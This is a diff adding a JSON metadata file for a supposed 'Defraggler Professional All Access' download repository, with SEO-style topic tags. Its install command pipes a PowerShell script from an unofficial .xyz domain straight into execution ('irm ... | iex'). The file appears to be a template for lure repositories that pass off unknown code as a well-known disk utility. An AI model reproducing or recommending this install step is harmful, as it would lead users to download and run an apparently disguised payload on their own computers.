@@ -1,0 +1,27 @@
+{
+  "repo": "defraggler-professional-all-access",
+  "product": "Defraggler Professional All Access",
+  "kind": "utility",
+  "install_type": "download",
+  "download_url": "https://defraggler.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "utility",
+  "topics": [
+    "defraggler-win64",
+    "defraggler-pc-edition",
+    "defraggler-connection-help",
+    "lightweight-client",
+    "system-utility",
+    "defraggler-download-page",
+    "driver-helper",
+    "file-manager",
+    "defraggler-quickstart",
+    "native-windows",
+    "hardware-info",
+    "defraggler-toolkit",
+    "pc-maintenance"
+  ]
+}
